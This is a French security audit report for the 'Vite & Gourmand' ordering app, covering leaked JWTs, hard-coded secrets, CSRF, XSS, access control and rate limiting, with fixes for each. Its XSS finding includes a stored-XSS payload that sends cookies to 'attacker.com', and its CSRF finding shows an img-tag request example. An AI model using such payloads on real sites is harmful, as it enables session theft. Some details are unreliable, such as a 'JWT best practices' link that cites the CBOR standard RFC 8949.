# 🔒 Rapport d'Audit de Sécurité — Vite & Gourmand

**Date du rapport :** 11 février 2026

---

## Table des matières

1. [Vulnérabilités Critiques](#vulnérabilités-critiques)
2. [Vulnérabilités Élevées](#vulnérabilités-élevées)
3. [Vulnérabilités Moyennes](#vulnérabilités-moyennes)
4. [Vulnérabilités Faibles](#vulnérabilités-faibles)
5. [Synthèse](#synthèse)

---

## 🔴 Vulnérabilités Critiques

### 1. Token JWT exposé dans le dépôt Git
**Fichier :** `backend/cookies.txt`

Un token JWT valide est commité en clair dans le dépôt. Ce fichier contient un cookie `authToken` avec un JWT signé pour un utilisateur `EMPLOYE` (sub: 2). Même si le fichier est actuellement dans le `.gitignore`, cela n'empêche pas qu'il soit déjà historisé dans l'historique Git.

- **Impact :** Un attaquant ayant accès au dépôt peut usurper l'identité d'un employé
- **Sévérité :** 🔴 **CRITIQUE**
- **Actions recommandées :**
  - Révoquer immédiatement le JWT secret utilisé pour signer ce token
  - Supprimer ce fichier de l'historique Git avec `git filter-repo` ou `git filter-branch`
  - Régénérer tous les tokens JWT en production

---

### 2. Secrets JWT de test prédictibles et réutilisés
**Fichiers :** `backend/phpunit.xml`, `scripts/tests/test_backend.sh`, `.github/workflows/test-backend.yml`

Le `JWT_SECRET` de test est un simple encodage base64 d'une phrase lisible : `test-jwt-secret-key-minimum-32-characters-long-for-HS256-algorithm-testing`. Ce même secret est réutilisé identiquement dans plusieurs fichiers. **Si ce secret est accidentellement utilisé en production, tous les tokens JWT peuvent être forgés par un attaquant.**

- **Impact :** Possibilité de forger des tokens JWT valides en production
- **Sévérité :** 🔴 **CRITIQUE**
- **Actions recommandées :**
  - Générer un secret JWT aléatoire et cryptographiquement sûr pour la production
  - Utiliser des secrets différents pour chaque environnement (dev, test, staging, prod)
  - Stocker les secrets en mode production dans un gestionnaire de secrets (Azure Key Vault, Vault, etc.)
  - Ne jamais commiter les secrets en dur dans le code

---

### 3. Mots de passe de base de données en clair dans les fichiers CI/CD
**Fichiers :** `.github/workflows/test-backend.yml`, `.github/workflows/email-integration.yml`, `scripts/tests/test_backend.sh`

Les mots de passe MySQL (`root`, `root_password_test`, `vite_pass`) et MongoDB (`root`) sont en dur dans les workflows et scripts de test. Bien que ces credentials cibles des environnements de test, ceux-ci pourraient être réutilisés par habitude ou par copie-coller en staging/production.

- **Impact :** Fuite de credentials, mauvaise hygiène de sécurité, réutilisation accidentelle en production
- **Sévérité :** 🔴 **CRITIQUE** (si utilisé en prod)
- **Actions recommandées :**
  - Ne jamais en dur les credentials dans les workflows GitHub
  - Utiliser les **GitHub Secrets** pour les credentials sensibles
  - Utiliser des conteneurs Docker avec des mots de passe par défaut générés aléatoirement pour les tests
  - Mettre en place une vraie solution de gestion des secrets (Azure Key Vault, Vault)

---

## 🟠 Vulnérabilités Élevées

### 4. Absence de protection CSRF (Cross-Site Request Forgery)
**Fichiers :** `frontend/js/profil.js`, `frontend/js/inscription.js`, `frontend/js/admin/dashboard.js`

Aucun token CSRF n'est inclus dans les formulaires ou les requêtes AJAX. L'authentification repose uniquement sur un cookie `authToken` (HttpOnly). **Un site malveillant pourrait déclencher des actions au nom de l'utilisateur connecté (créer commande, valider avis, modifier statut) à son insu.**

**Exemple d'attaque :**
```html
<!-- Sur un site malveillant -->
<img src="https://vite-et-gourmand.com/api/commandes" alt="image">
<!-- Le navigateur envoie automatiquement le cookie d'authentification -->
```

- **Impact :** Modification de données, création de commandes non autorisées, vol de données
- **Sévérité :** 🟠 **ÉLEVÉE**
- **Actions recommandées :**
  - Implémenter des tokens CSRF générés dynamiquement
  - Inclure le token CSRF dans tous les formulaires et requêtes AJAX destructives (POST, PATCH, DELETE)
  - Utiliser le `SameSite` cookie attribute (`SameSite=Strict` ou `SameSite=Lax`)
  - Valider le token côté backend pour toutes les requêtes sensibles

---

### 5. Injection XSS potentielle dans le dashboard admin
**Fichier :** `frontend/js/admin/dashboard.js` (fonction `fetchAndRenderAvis`, ligne ~1108)

Les commentaires des avis sont injectés dans le DOM via concaténation de chaînes ou `innerHTML`. Si les données ne sont pas échappées correctement, **un attaquant pourrait injecter du code JavaScript malveillant** qui s'exécuterait dans le navigateur de l'administrateur.

```javascript
// Potentiellement vulnérable :
html += reviews.map(avis => {
    return `<div>${avis.commentaire}</div>`; // commentaire non échappé !
});
```

Bien que `avis-carousel.js` dispose d'une fonction `escapeHtml()`, rien ne garantit qu'elle est systématiquement appliquée dans le dashboard admin.

**Exemple d'attaque :**
```
Avis : "><script>fetch('https://attacker.com/?cookies=' + document.cookie)</script>"
```

- **Impact :** XSS stocké — vol de tokens, cookies de session, redirection vers phishing
- **Sévérité :** 🟠 **ÉLEVÉE**
- **Actions recommandées :**
  - Échapper **systématiquement** toutes les données provenant de l'utilisateur avec `escapeHtml()` ou une fonction équivalente sécurisée
  - Utiliser des méthodes sûres pour injecter du contenu (ex: `textContent` au lieu de `innerHTML`)
  - Implémenter une Content Security Policy (CSP) stricte
  - Faire un code review des fonctions manipulant le DOM

---

### 6. Contrôle d'accès côté client uniquement (Admin Guard)
**Fichier :** `frontend/js/admin/dashboard.js` (lignes 1-10)

La protection de la page admin repose entièrement sur `AdminGuard.checkAccess()` côté JavaScript. **Un attaquant peut contourner cette protection en :**
- Désactivant JavaScript dans son navigateur
- Manipulant le DOM avec les DevTools
- Modifiant les requêtes réseau directement

```javascript
try {
    currentUser = await AdminGuard.checkAccess();
} catch (e) {
    return; // Seul le client bloque l'accès !
}
```

**La sécurité doit être appliquée côté backend.** Bien que certaines routes backend utilisent `AuthMiddleware` et `RoleMiddleware`, il faut vérifier que **toutes** les routes admin sont protégées côté serveur.

- **Impact :** Accès non autorisé aux fonctionnalités d'administration
- **Sévérité :** 🟠 **ÉLEVÉE**
- **Actions recommandées :**
  - **OBLIGATOIRE :** Ajouter une vérification des rôles et permissions côté backend pour chaque endpoint admin
  - Utiliser un middleware de vérification des rôles sur toutes les routes sensibles
  - Ne jamais compter exclusivement sur les contrôles côté client
  - Implémenter une vérification robuste du statut utilisateur (admin, employé, client)

---

### 7. Validation insuffisante des types côté backend
**Fichier :** `backend/src/Validators/MenuValidator.php` (ligne 46)

La validation utilise `is_int()` pour vérifier le stock et le nombre de personnes. En PHP :
- Les données de JSON décodé avec `json_decode` peuvent être `int` ou `string`
- Les données de formulaires multipart sont **toujours des `string`**
- `is_int("5")` retourne `false` → la validation échoue

```php
} elseif (!is_int($data['stock'])) {
    $errors['stock'] = 'Le stock doit être un entier.';
}
```

Cela peut permettre un **bypass de validation** ou causer des erreurs inattendues.

- **Impact :** Données incohérentes en base de données, bypass de validation, comportement imprévisible
- **Sévérité :** 🟠 **ÉLEVÉE**
- **Actions recommandées :**
  - Utiliser `is_numeric()` ou `ctype_digit()` pour accepter les chaînes numériques
  - Convertir explicitement les chaînes en entiers : `(int)$data['stock']`
  - Valider les limites numériques minimales et maximales
  - Utiliser des cast de type stricts : `(int)` ou utiliser una bibliothèque de validation

---

## 🟡 Vulnérabilités Moyennes

### 8. Fichier `.env` et configurations non suffisamment protégées
**Fichiers :** `.env`, `.env.compose`, `.gitignore`

Bien que `.env` soit dans le `.gitignore`, le fichier `.env.compose` existe physiquement dans le workspace et pourrait contenir des secrets. De plus, s'il existe un serveur web qui sert des fichiers statiques depuis la racine, ces fichiers pourraient être accessibles.

- **Impact :** Fuite de secrets (API keys, connexions BD, JWT secrets)
- **Sévérité :** 🟡 **MOYENNE**
- **Actions recommandées :**
  - Configurer le serveur web pour **bloquer l'accès aux fichiers `.env` et `.env.*`**
  - Vérifier que `.env` est dans `.gitignore` et ne pas le commiter
  - Utiliser un gestionnaire de secrets en production (Azure Key Vault, Vault, etc.)
  - Charger les secrets depuis les variables d'environnement système, pas depuis des fichiers

---

### 9. CORS potentiellement mal configuré
**Fichier :** `Docs/documentation_technique/DOCUMENTATION_DEPLOIEMENT.md` (ligne 833)

La documentation mentionne des erreurs CORS comme problème courant, ce qui suggère que la configuration CORS n'est **pas strictement définie**. Une configuration CORS trop permissive (`Access-Control-Allow-Origin: *`) combinée avec l'authentification par cookie permettrait des **attaques cross-origin**.

- **Impact :** Requêtes cross-origin non autorisées, vol de données
- **Sévérité :** 🟡 **MOYENNE**
- **Actions recommandées :**
  - Définir explicitement les origines autorisées : `Access-Control-Allow-Origin: https://domaine.com`
  - **Ne jamais utiliser `*` en production** si l'application utilise les cookies pour l'authentification
  - Vérifier les en-têtes CORS dans les réponses du backend
  - Tester la configuration CORS avec des outils comme `curl` ou Postman

---

### 10. Absence de rate limiting sur les endpoints sensibles
**Fichier :** `backend/api/routes.commandes.php` et autres routes d'authentification

Aucun mécanisme de rate limiting n'est visible sur les endpoints sensibles :
- `/api/auth/login` → vulnérable au brute-force de mots de passe
- `/api/auth/forgot-password` → vulnérable au spam
- `/api/commandes` → vulnérable au DDoS applicatif

Un attaquant pourrait :
- Tenter des milliers de mots de passe pour accéder à un compte
- Surcharger le serveur en demandes répétées
- Générer des faux avis massifs

- **Impact :** Brute-force de mots de passe, spam, DDoS applicatif
- **Sévérité :** 🟡 **MOYENNE**
- **Actions recommandées :**
  - Implémenter un rate limiting sur `/api/auth/login` (ex: 5 tentatives / 15 minutes)
  - Limiter les requêtes par IP, par session, ou par identifiant d'utilisateur
  - Utiliser une librairie PHP pour le rate limiting (ex: `symfony/rate-limiter`)
  - Logger et alerter sur les tentatives suspectes
  - Bloquer temporairement les IPs ayant trop de tentatives échouées

---

### 11. Mot de passe de test identique pour tous les comptes
**Fichier :** `backend/database/sql/database_fixtures.sql`

Tous les comptes de test utilisent le même mot de passe : `Password123!`. Si ces fixtures sont chargées en production (ce que le workflow `deploy-azure.yml` semble faire à la ligne 154), **les comptes admin et employés seraient accessibles avec ce mot de passe par défaut.**

```sql
-- Fixture SQL pour les comptes de test
INSERT INTO users VALUES (1, 'admin', 'Password123!', ...);
INSERT INTO users VALUES (2, 'employe', 'Password123!', ...);
```

**Cela signifierait une compromission complète de l'application.**

- **Impact :** Accès non autorisé à tous les comptes, compromission totale de l'application en production
- **Sévérité :** 🟡 **MOYENNE** (🔴 **CRITIQUE** si déployé en production)
- **Actions recommandées :**
  - **NE JAMAIS charger les fixtures de test en production**
  - Séparer les fixtures test et production
  - Vérifier votre workflow CI/CD pour s'assurer qu'il n'exécute pas les fixtures en prod
  - En production, utiliser des comptes avec des mots de passe forts générés aléatoirement
  - Implémenter une vérification pour empêcher le chargement accidentel de fixtures en production

---

### 12. SSL désactivé dans le conteneur
**Fichier :** `docker/apache/vite-ssl.conf`

Le conteneur Apache n'active pas SSL/TLS. Le commentaire indique que la terminaison HTTPS est gérée par Azure App Service. **Si l'application est déployée hors d'Azure ou si le proxy inverse n'est pas correctement configuré, le trafic circule en HTTP clair entre le proxy et le conteneur.**

```conf
# SSL désactivé : la terminaison HTTPS est gérée par Azure App Service
```

- **Impact :** Interception de données sensibles (tokens, mots de passe) sur le réseau interne
- **Sévérité :** 🟡 **MOYENNE**
- **Actions recommandées :**
  - Vérifier que le proxy reverse (Azure App Service, Nginx, etc.) force vraiment HTTPS
  - Implémenter HTTPS end-to-end : client → proxy → backend
  - Utiliser des certificats SSL auto-signés pour le conteneur en développement
  - En production, chiffrer la communication interne avec mTLS ou VPN

---

## 🔵 Vulnérabilités Faibles / Bonnes Pratiques

### 13. Cookie d'authentification sans flag `Secure`
**Fichier :** `backend/cookies.txt`

Le cookie `authToken` montre `FALSE` pour le flag `Secure` (5ème colonne), signifiant que le cookie est envoyé même sur HTTP non chiffré.

```
authToken    FALSE    /    FALSE    ...
                     ↑
                 Pas de Secure !
```

- **Impact :** Interception du cookie sur connexions HTTP non chiffrées
- **Sévérité :** 🔵 **FAIBLE** (dans un contexte HTTPS obligatoire)
- **Actions recommandées :**
  - Ajouter le flag `Secure` au cookie d'authentification
  - Forcer redirection HTTP → HTTPS

---

### 14. Absence de Content Security Policy (CSP)
**Fichiers :** `frontend/frontend/pages/home.html` et autres templates

Aucun en-tête `Content-Security-Policy` n'est visible dans les templates HTML. Cela facilite l'exploitation d'éventuelles failles XSS.

- **Impact :** Réduction de la surface d'attaque XSS
- **Sévérité :** 🔵 **FAIBLE**
- **Actions recommandées :**
  - Ajouter un en-tête CSP strict au backend :
    ```
    Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:;
    ```
  - Tester avec [CSP Evaluator](https://csp-evaluator.appspot.com/)

---

### 15. Messages d'erreur trop verbeux
**Fichier :** `backend/src/Exceptions/CommandeException.php`

Les messages d'exception exposent des détails internes (IDs, minimums, statuts) :

```php
public static function invalidQuantity(int $provided, int $min): self
{
    return new self(
        "Le nombre de personnes ($provided) est inférieur au minimum requis ($min).",
        400
    );
}
```

Ces informations aident un attaquant à cartographier la logique métier.

- **Impact :** Information disclosure, cartographie de l'application
- **Sévérité :** 🔵 **FAIBLE**
- **Actions recommandées :**
  - Afficher un message générique au client : `"Erreur de requête"`
  - Logger les détails côté serveur pour le debugging
  - Utiliser deux messages : public (client) et private (logs)

---

### 16. Dépendances potentiellement vulnérables
**Fichier :** `backend/composer.json`

Les dépendances PHP ne sont pas figées avec les versions exactes. Cela pourrait entraîner des installations de versions différentes selon les environnements.

- **Impact :** Comportement imprévisible, vulnérabilités de dépendances
- **Sévérité :** 🔵 **FAIBLE**
- **Actions recommandées :**
  - Commiter le fichier `composer.lock` dans le dépôt
  - Exécuter régulièrement `composer audit` pour détecter les vulnérabilités connues
  - Mettre à jour les dépendances de manière contrôlée

---

## 📊 Synthèse Générale

| Sévérité | Nombre | Total d'éléments |
|----------|--------|-----------------|
| 🔴 Critique | 3 vulnérabilités | **3** |
| 🟠 Élevée | 4 vulnérabilités | **4** |
| 🟡 Moyenne | 5 vulnérabilités | **5** |
| 🔵 Faible | 4 recommandations | **4** |

**Total : 16 problèmes identifiés**

---

## ⚠️ Actions Prioritaires (À faire IMMÉDIATEMENT)

### Semaine 1 - CRITIQUE

1. **Révoquer le JWT secret actuel**
   - Générer un nouveau secret cryptographiquement sûr
   - Invalider tous les tokens JWT existants
   - Déployer le nouveau secret en production

2. **Supprimer `cookies.txt` de l'historique Git**
   ```bash
   git filter-repo --path backend/cookies.txt --invert-paths
   ```

3. **Séparer les secrets par environnement**
   - Utiliser GitHub Secrets pour les workflows CI/CD
   - Mettre en place Azure Key Vault pour production

4. **Tester que les routes admin sont protégées côté backend**
   - Vérifier que chaque endpoint admin vérifie le rôle utilisateur
   - Ajouter `RoleMiddleware` à toutes les routes sensibles

---

### Semaine 2 - ÉLEVÉ

5. **Implémenter la protection CSRF**
   - Générer des tokens CSRF par session
   - Valider les tokens sur toutes les requêtes destructives

6. **Échapper tous les données XSS**
   - Auditer et corriger la fonction `fetchAndRenderAvis`
   - Utiliser `textContent` au lieu de `innerHTML` quand possible
   - Implémenter une CSP stricte

7. **Corriger la validation des types**
   - Utiliser `is_numeric()` et conversion de type explicite
   - Ajouter des validations de limites (min/max)

---

### Semaine 3-4 - MOYEN

8. **Implémenter le rate limiting**
   - Sur login, password reset, création de commande
   - Bloquer après 5 tentatives échouées pendant 15 minutes

9. **Vérifier l'absence de fixtures de test en production**
   - Séparer `database_fixtures.sql` (test) et `database_prod.sql` (production)
   - Ajouter une vérification dans le CI/CD

10. **Sécuriser les fichiers `.env`**
    - Configurez le serveur web pour bloquer l'accès à `.env`
    - Utiliser les variables d'environnement système en production

---

## 🔗 Ressources Supplémentaires

- **OWASP Top 10 :** https://owasp.org/www-project-top-ten/
- **PHP Security :** https://www.php.net/manual/en/security.php
- **JWT Best Practices :** https://tools.ietf.org/html/rfc8949
- **CSRF Protection :** https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
- **XSS Prevention :** https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

---

**Rapport établi par :** Audit de Sécurité Automatisé  
**Date :** 11 février 2026  
**Prochaine revue recommandée :** Après implémentation des correctifs
